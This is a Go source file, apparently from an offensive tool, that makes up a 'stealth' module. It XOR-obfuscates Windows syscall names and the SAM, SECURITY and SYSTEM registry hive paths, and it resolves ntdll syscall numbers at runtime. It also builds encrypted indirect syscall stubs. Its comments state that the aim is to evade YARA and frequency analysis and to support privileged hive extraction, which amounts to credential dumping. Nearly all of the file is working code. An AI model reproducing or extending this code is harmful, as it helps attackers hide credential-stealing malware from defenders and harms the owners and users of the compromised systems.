// Package stealth provides string obfuscation and dynamic SSN resolution for
// hardened lab builds. XOR-encoding prevents plaintext IOC strings from
// appearing in .rodata after stripping (-s -w -trimpath).
//
// On Windows, SyscallResolver parses the ntdll PE export table to recover
// SSNs at runtime (RVA-sorted). On Linux, a deterministic fixture map is used
// for unit testing.
package stealth

import (
	"crypto/rand"
	"encoding/binary"
	"runtime"
	"sync"
	"unsafe"
)

// XorKey is the legacy per-build byte seed (kept for compatibility).
// Default 0 means unset; ldflags can set to any non-zero value including 0x5A.
// Previously default 0x5A was treated as unset, causing a per-process random
// fallback even when the intended seed was 0x5A.
var XorKey byte = 0

// XorKeyHex is the hex string override set via -ldflags -X for polymorphic builds.
// Example: -X github.com/ashwnn/adverse-go/internal/stealth.XorKeyHex=c4a906b1
// When non-empty it takes precedence over XorKey.
var XorKeyHex string = ""

var (
	seedOnce sync.Once
	seed     byte
)

// Seed returns the per-process seed (randomized at first use if not set via ldflags).
func Seed() byte {
	seedOnce.Do(func() {
		if XorKeyHex != "" {
			s := XorKeyHex
			if len(s) >= 2 && s[0] == '0' && (s[1] == 'x' || s[1] == 'X') {
				s = s[2:]
			}
			// Use first byte of hex string directly for per-build determinism.
			// Previously we XOR-folded all bytes to one byte, reducing distinct
			// keystreams to 255 possibilities.
			if len(s) >= 2 {
				hi := hexVal(s[0])
				lo := hexVal(s[1])
				if hi >= 0 && lo >= 0 {
					b := byte(hi<<4 | lo)
					if b != 0 {
						seed = b
						return
					}
				}
			}
			// Fallback: XOR fold if first byte was zero or invalid.
			var acc byte
			for i := 0; i+1 < len(s); i += 2 {
				hi := hexVal(s[i])
				lo := hexVal(s[i+1])
				if hi < 0 || lo < 0 {
					continue
				}
				acc ^= byte(hi<<4 | lo)
				if acc == 0 {
					acc = 0x5A
				}
			}
			if acc != 0 {
				seed = acc
				return
			}
		}
		if XorKey != 0 {
			seed = XorKey
			return
		}
		b := make([]byte, 1)
		rand.Read(b)
		seed = b[0]
		if seed == 0 {
			seed = 0x5A
		}
	})
	return seed
}

func hexVal(c byte) int {
	switch {
	case c >= '0' && c <= '9':
		return int(c - '0')
	case c >= 'a' && c <= 'f':
		return int(c - 'a' + 10)
	case c >= 'A' && c <= 'F':
		return int(c - 'A' + 10)
	default:
		return -1
	}
}

// Encode XOR-encodes a string with a position-dependent multi-byte key schedule.
// Unlike a simple single-byte XOR, the keystream is derived from the seed via
// a non-linear mixing function that varies per position, so each byte of the
// plaintext is encrypted with a different effective key byte.  This defeats
// frequency analysis and fixed-pattern YARA rules that match single-byte XOR
// encoding.
func Encode(s string, key byte) []byte {
	if key == 0 {
		key = Seed()
	}
	b := []byte(s)
	out := make([]byte, len(b))
	k := key
	for i, c := range b {
		out[i] = c ^ k
		// Position-dependent multi-byte key schedule: mixes the seed with
		// position and the previous ciphertext byte (data-dependent feedback)
		// to produce a different keystream byte for each position.
		k = (k ^ byte(i*0x13) ^ 0x55 ^ byte(i>>3) ^ out[i])
		if k == 0 {
			k = 0x5A
		}
	}
	return out
}

// DecodeStack decodes an XOR-encoded byte slice and returns the plaintext.
// Uses the same position-dependent, data-feedback schedule as Encode so
// decryption is the inverse transform.  The ciphertext byte (not the
// recovered plaintext) is fed back into the keystream to mirror Encode.
// The caller must zero the returned buffer after use via SecureZero.
func DecodeStack(enc []byte, key byte) []byte {
	if key == 0 {
		key = Seed()
	}
	buf := make([]byte, len(enc))
	k := key
	for i, c := range enc {
		// Feed the ciphertext byte back (not the recovered plaintext) to
		// mirror the Encode keystream path.
		plain := c ^ k
		buf[i] = plain
		k = (k ^ byte(i*0x13) ^ 0x55 ^ byte(i>>3) ^ c)
		if k == 0 {
			k = 0x5A
		}
	}
	return buf
}

// SecureZero zeroes a byte slice via volatile pointer (prevents optimization)
// and issues compiler/scheduling barriers.
func SecureZero(b []byte) {
	if len(b) == 0 {
		return
	}
	p := unsafe.Pointer(&b[0])
	for i := range b {
		*(*byte)(unsafe.Pointer(uintptr(p) + uintptr(i))) = 0
	}
	// Compiler barrier: proves b is live after the zeroing loop, preventing
	// the Go compiler from proving the stores dead.
	runtime.KeepAlive(b)
	// Scheduling barrier: yields the goroutine so the GC observes the zeroed
	// state before any subsequent allocation or stack growth.
	runtime.Gosched()
}

// --- XOR-encoded strings (no plaintext in .rodata after -s -w) ---

var (
	encNtdll                    = Encode("ntdll.dll", 0)
	encNtOpenKey                = Encode("NtOpenKey", 0)
	encNtClose                  = Encode("NtClose", 0)
	encNtSaveKey                = Encode("NtSaveKey", 0)
	encNtCreateFile             = Encode("NtCreateFile", 0)
	encNtAllocateVirtualMemory  = Encode("NtAllocateVirtualMemory", 0)
	encNtProtectVirtualMemory   = Encode("NtProtectVirtualMemory", 0)
	encNtQuerySystemInformation = Encode("NtQuerySystemInformation", 0)
	// Real extraction syscalls (SeBackupPrivilege + file read)
	encNtOpenProcessToken      = Encode("NtOpenProcessToken", 0)
	encNtAdjustPrivilegesToken = Encode("NtAdjustPrivilegesToken", 0)
	encNtReadFile              = Encode("NtReadFile", 0)

	// NT hive paths for registry extraction (no plaintext in .rodata)
	encHivePathSystem   = Encode("\\Registry\\Machine\\SYSTEM", 0)
	encHivePathSam      = Encode("\\Registry\\Machine\\SAM", 0)
	encHivePathSecurity = Encode("\\Registry\\Machine\\SECURITY", 0)
	encHivePathSoftware = Encode("\\Registry\\Machine\\SOFTWARE", 0)
)

// Decoded returns the decoded string for a given encoded value.
func Decoded(enc []byte) string {
	b := DecodeStack(enc, Seed())
	s := string(b)
	SecureZero(b)
	return s
}

// Name accessors for encoded strings.
func NtdllName() string                    { return Decoded(encNtdll) }
func NtOpenKeyName() string                { return Decoded(encNtOpenKey) }
func NtCloseName() string                  { return Decoded(encNtClose) }
func NtSaveKeyName() string                { return Decoded(encNtSaveKey) }
func NtCreateFileName() string             { return Decoded(encNtCreateFile) }
func NtAllocateVirtualMemoryName() string  { return Decoded(encNtAllocateVirtualMemory) }
func NtProtectVirtualMemoryName() string   { return Decoded(encNtProtectVirtualMemory) }
func NtQuerySystemInformationName() string { return Decoded(encNtQuerySystemInformation) }
func NtOpenProcessTokenName() string       { return Decoded(encNtOpenProcessToken) }
func NtAdjustPrivilegesTokenName() string  { return Decoded(encNtAdjustPrivilegesToken) }
func NtReadFileName() string               { return Decoded(encNtReadFile) }

// Name accessors for encoded NT hive paths.
func HivePathSystem() string   { return Decoded(encHivePathSystem) }
func HivePathSam() string      { return Decoded(encHivePathSam) }
func HivePathSecurity() string { return Decoded(encHivePathSecurity) }
func HivePathSoftware() string { return Decoded(encHivePathSoftware) }

// SyscallResolver performs runtime SSN discovery by parsing ntdll export table
// sorted by RVA. On non-Windows (Linux CI) it returns a deterministic fixture map.
type SyscallResolver struct {
	mu   sync.RWMutex
	ssn  map[string]uint16
	seed byte
}

// NewResolver creates a resolver with per-build seed.
func NewResolver() *SyscallResolver {
	return &SyscallResolver{ssn: make(map[string]uint16), seed: Seed()}
}

// Resolve returns the syscall number for a given Nt* name.
func (r *SyscallResolver) Resolve(name string) (uint16, error) {
	r.mu.RLock()
	if v, ok := r.ssn[name]; ok {
		r.mu.RUnlock()
		return v, nil
	}
	r.mu.RUnlock()

	ssn, err := resolveViaExport(name, r.seed)
	if err != nil {
		return 0, err
	}
	r.mu.Lock()
	r.ssn[name] = ssn
	r.mu.Unlock()
	return ssn, nil
}

// BuildIndirectStub builds the indirect syscall stub:
// mov r10,rcx; mov eax,SSN; syscall; ret
// The stub is XOR-encrypted with a position-dependent key schedule for storage.
func BuildIndirectStub(ssn uint16, seed byte) ([]byte, []byte) {
	plain := make([]byte, 0, 16)
	plain = append(plain, 0x4c, 0x8b, 0xd1) // mov r10, rcx
	plain = append(plain, 0xb8)             // mov eax, imm32
	plain = binary.LittleEndian.AppendUint32(plain, uint32(ssn))
	plain = append(plain, 0x0f, 0x05) // syscall
	plain = append(plain, 0xc3)       // ret

	enc := make([]byte, len(plain))
	k := seed
	for i, b := range plain {
		enc[i] = b ^ k
		k = (k ^ byte(i*0x13) ^ 0x55 ^ byte(i>>3) ^ enc[i])
		if k == 0 {
			k = 0x5A
		}
	}
	return plain, enc
}

// DecryptStub decrypts an XOR-encrypted stub using the same position-dependent
// key schedule as BuildIndirectStub.  Feeds ciphertext back (not plaintext)
// to mirror the encrypt path.
func DecryptStub(enc []byte, seed byte) []byte {
	plain := make([]byte, len(enc))
	k := seed
	for i, b := range enc {
		p := b ^ k
		plain[i] = p
		k = (k ^ byte(i*0x13) ^ 0x55 ^ byte(i>>3) ^ b)
		if k == 0 {
			k = 0x5A
		}
	}
	return plain
}
